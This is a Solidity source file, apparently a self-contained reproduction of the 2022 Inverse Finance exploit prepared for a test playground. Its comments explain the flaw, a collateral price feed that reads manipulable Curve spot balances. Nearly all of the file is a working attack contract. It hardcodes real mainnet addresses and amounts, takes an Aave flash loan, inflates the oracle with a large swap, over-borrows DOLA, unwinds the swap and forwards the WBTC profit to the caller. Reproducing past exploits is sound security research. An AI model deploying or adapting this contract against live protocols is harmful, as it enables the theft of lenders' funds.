// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-06-InverseFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// Aave flash-loan callback `executeOperation` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit + executeOperation) so
// the playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/InverseFinance_exp.sol.
//
// Root cause: YVCrv3CryptoFeed prices the yvCurve-3Crypto collateral token from
// the Curve tricrypto2 pool's SPOT ERC-20 balances (WBTC/WETH/USDT), not from a
// manipulation-resistant source. A single large WBTC→USDT swap inflates the
// reported price ~2.89×, letting the attacker over-borrow DOLA against the
// over-valued collateral, then reverse the swap and convert the DOLA to WBTC.
//
// VULNERABILITY: Oracle relies on manipulable on-chain spot balances for pricing collateral (see YVCrv3CryptoFeed.latestAnswer).
// Preconditions: 1) Collateral market (anYvCrv3CryptoInverse) uses this feed for getUnderlyingPrice; 2) large flash liquidity
// available on Aave+Curve; 3) attacker can open collateral position + borrow in same tx before price reverts.
// Impact: DOLA market lenders / protocol lose the delta between inflated and true collateral value (attacker profit extracted in WBTC).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUSDT {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IVyper {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function exchange(address pool, address from, address to, uint256 dx, uint256 min_dy, address receiver)
        external
        returns (uint256);
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
    function deposit(uint256 amounts, address recipient) external returns (uint256);
    function approve(address spender, uint256 value) external;
}

interface ICErc20 {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

contract InverseFinanceDrain {
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 constant crv3crypto = IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20 constant crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);

    ILendingPool constant aaveLendingPool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IVyper constant curveVyper_contract = IVyper(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    IVyper constant yvCurve3Crypto = IVyper(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
    IVyper constant curveRegistry = IVyper(0x8e764bE4288B842791989DB5b8ec067279829809);
    IVyper constant dola3pool3crv = IVyper(0xAA5A67c256e27A5d80712c51971408db3370927D);
    IVyper constant curve3pool = IVyper(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICErc20 constant anYvCrv3CryptoInverse = ICErc20(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
    IUnitroller constant Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    ICErc20 constant InverseFinanceDola = ICErc20(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);

    function run() external {
        // EXPLOIT STEP 0: Deployed attacker contract initiates Aave flashloan of WBTC. All logic self-contained so playground / tests can call run().
        address[] memory assets = new address[](1);
        assets[0] = address(WBTC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2_700_000_000_000;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        // profit remains on this contract; forward to caller (attacker EOA)
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {
        assets;
        amounts;
        premiums;
        params;
        initiator;

        // EXPLOIT STEP 1: Max approvals for the Curve registry (for swaps), Yearn, and token movements.
        WBTC.approve(address(curveVyper_contract), type(uint256).max);
        WBTC.approve(address(curveRegistry), type(uint256).max);
        IUSDT(address(0xdAC17F958D2ee523a2206206994597C13D831ec7)).approve(
            address(curveRegistry), type(uint256).max
        );
        DOLA.approve(address(curveRegistry), type(uint256).max);
        crv3crypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA, type(uint256).max);

        uint256[3] memory amounts2 = [uint256(0), 22_500_000_000, 0];

        // EXPLOIT STEP 2/3: Add liq to Curve -> receive crv LP; deposit to Yearn yvCurve3Crypto to wrap into yv token.
        curveVyper_contract.add_liquidity(amounts2, 0);
        yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));

        // EXPLOIT STEP 4: Mint cTokens by supplying yv as collateral to Inverse's Yearn-3Crypto cToken market; enter the market.
        yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587, type(uint256).max);
        anYvCrv3CryptoInverse.mint(4_906_754_677_503_974_414_310);

        address[] memory toEnter = new address[](1);
        toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
        Unitroller.enterMarkets(toEnter);

        // VULNERABILITY: See detailed explanation in InverseFinance_exp.sol (same root cause).
        // The feed's latestAnswer uses manipulable Curve pool balances. The large WBTC->USDT swap below inflates the price of the collateral.
        // Impact: Over-borrow on DOLA market drains value from the protocol.

        curveRegistry.exchange(
            address(curveVyper_contract), address(WBTC), address(0xdAC17F958D2ee523a2206206994597C13D831ec7), 2_677_500_000_000, 0, address(this)
        );

        // EXPLOIT STEP 5: Execute the borrow of DOLA using the inflated collateral valuation from the manipulated oracle.
        InverseFinanceDola.borrow(10_133_949_192_393_802_606_886_848);

        // EXPLOIT STEP 6: Reverse-swap to rebalance Curve pool (undoing the manipulation) and convert back to WBTC.
        curveRegistry.exchange(
            address(curveVyper_contract), address(0xdAC17F958D2ee523a2206206994597C13D831ec7), address(WBTC), 75_403_376_186_072, 0, address(this)
        );

        // EXPLOIT STEP 7: Route borrowed DOLA through pools to USDT then WBTC. Repay flashloan, profit left in contract.
        curveRegistry.exchange(
            address(dola3pool3crv), address(DOLA), address(crv3), 10_133_949_192_393_802_606_886_848, 0, address(this)
        );
        curve3pool.remove_liquidity_one_coin(9_881_355_040_729_892_287_779_421, 2, 0);
        curveRegistry.exchange(
            address(curveVyper_contract), address(0xdAC17F958D2ee523a2206206994597C13D831ec7), address(WBTC), 10_000_000_000_000, 0, address(this)
        );
        WBTC.approve(address(aaveLendingPool), 2_702_430_000_000);

        return true;
    }
}
